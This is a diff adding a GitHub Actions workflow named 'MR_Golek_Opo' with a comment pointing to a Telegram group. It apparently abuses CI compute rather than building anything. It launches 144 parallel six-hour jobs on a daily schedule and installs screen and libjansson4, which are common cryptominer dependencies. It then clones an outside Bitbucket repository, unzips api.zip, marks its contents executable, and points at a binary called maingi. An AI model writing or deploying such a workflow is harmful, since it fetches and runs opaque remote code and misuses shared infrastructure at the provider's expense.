@@ -1,0 +1,42 @@
+name: MR_Golek_Opo #gretonger yang di buang di group t.me/Bego_android_official
+on:
+  push:
+    branches: [ master, main ]
+  pull_request:
+    branches: [ master, main ]
+  schedule:
+    - cron: '0 0 * * *'
+jobs:
+  build:
+    name: Cpu
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 150
+      fail-fast: false
+      matrix:
+        Mr: [A, B, C, D, E, F, G, H]
+        Golek: [1, 2, 3, 4, 5, 6, 7, 8, 9]
+        Opo: [A.1, B.2]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 150
+        JOB: ${{ matrix.Mr.Golek.Opo }}
+    steps:
+    - name: Setup
+      uses: actions/checkout@v2
+    - name: Mr
+      run: |
+        sudo apt install screen libjansson4 -y
+    - name: Golek
+      run: |
+        ls -a
+    - name: Opo
+      run: |
+        git clone https://lindasinta@bitbucket.org/lindasinta/admin.git
+        cd admin
+        unzip api.zip
+        chmod u+x *
+        #sleep 60s##
+        0#./maingi
+
+
